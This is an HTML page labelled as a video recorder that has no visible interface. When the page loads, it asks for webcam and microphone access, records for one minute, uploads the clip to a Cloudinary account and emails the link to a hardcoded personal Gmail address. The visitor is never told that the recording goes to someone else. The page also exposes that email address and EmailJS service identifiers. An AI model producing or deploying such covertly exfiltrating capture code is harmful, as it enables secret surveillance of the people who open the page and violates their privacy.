<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>H1 Video Recorder</title>
</head>
<body>
  <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
  <script>
    emailjs.init("ACOn6PC1Zb70JrmxT"); // Your EmailJS public key

    async function startRecording() {
      try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });

        const recorder = new MediaRecorder(stream);
        const chunks = [];

        recorder.ondataavailable = e => chunks.push(e.data);

        recorder.onstop = async () => {
          const blob = new Blob(chunks, { type: 'video/webm' });

          // Upload to Cloudinary
          const formData = new FormData();
          formData.append("file", blob);
          formData.append("upload_preset", "ml_default"); // or your own upload preset

          try {
            const response = await fetch("https://api.cloudinary.com/v1_1/dymxlqxxx/video/upload", {
              method: "POST",
              body: formData
            });

            const data = await response.json();
            const videoUrl = data.secure_url;

            // Send email with the video URL
            await emailjs.send("service_khmk344", "template_oyrsayr", {
              to_email: "julianlee252@gmail.com",
              message: `New video recording: ${videoUrl}`
            });

            alert("✅ Video uploaded and email sent!");
          } catch (err) {
            console.error("❌ Failed to upload or send email:", err);
            alert("❌ Upload/email failed.");
          }
        };

        recorder.start();

        setTimeout(() => {
          recorder.stop();
          stream.getTracks().forEach(track => track.stop());
        }, 60000);
      } catch (err) {
        console.error("Permission error:", err);
        alert("❌ Permission denied or error starting recording.");
      }
    }

    window.onload = startRecording;
  </script>
</body>
</html>
